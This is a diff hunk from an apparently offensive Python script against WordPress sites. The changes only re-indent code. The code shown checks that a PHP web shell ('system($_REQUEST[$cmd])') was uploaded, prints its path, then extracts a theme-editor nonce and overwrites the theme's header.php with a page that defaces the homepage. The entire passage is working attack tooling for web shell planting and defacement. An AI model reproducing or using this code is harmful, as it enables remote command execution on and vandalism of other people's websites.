@@ -66,22 +66,22 @@ system($_REQUEST[$cmd]); } ?>"""
       ss=c.get(shell, headers=headers).content
       title="<title>Upload files...</title>"
       if title in ss:
-	      print("===> Shell Uploaded Successfully! :D")
-	      print("===> " + shell) 
-	      print('===> Uploading deface page...')
-	      editor2=admin + 'theme-editor.php?file=header.php#template'
-        req2=c.get(editor2, headers=headers)
-        source2=req2.content
-        nonce2=re.findall('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"',source2)
-        for b in nonce2:
-	      wpnonce2=b
-	      defc="<?php die(\"" + defcode + "\"); ?>"
-	      form_data2 = {"_wpnonce":wpnonce2, "_wp_http_referer":"/wp-admin/theme-editor.php?file=header.php", "newcontent":defc, "action":"update", "file":"header.php", "theme":name, "scrollto":"0", "docs-list":"", "submit":"Update+File"}
-	      c.post(edit, data=form_data2, headers=headers)
-	      print('===> Successfully Defaced Homepage!!!')
+	print("===> Shell Uploaded Successfully! :D")
+	print("===> " + shell) 
+	print('===> Uploading deface page...')
+	editor2=admin + 'theme-editor.php?file=header.php#template'
+	req2=c.get(editor2, headers=headers)
+	source2=req2.content
+	nonce2=re.findall('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"',source2)
+	for b in nonce2:
+	  wpnonce2=b
+	defc="<?php die(\"" + defcode + "\"); ?>"
+	form_data2 = {"_wpnonce":wpnonce2, "_wp_http_referer":"/wp-admin/theme-editor.php?file=header.php", "newcontent":defc, "action":"update", "file":"header.php", "theme":name, "scrollto":"0", "docs-list":"", "submit":"Update+File"}
+	c.post(edit, data=form_data2, headers=headers)
+	print('===> Successfully Defaced Homepage!!!')
       else:
-	      print("===> Shell Upload Failed :(")
-	      print("===> upload deface failed :(")
+	print("===> Shell Upload Failed :(")
+	print("===> upload deface failed :(")
     else:
       print('===> Login Failed! Maybe Your password is incorrect!')
   else:
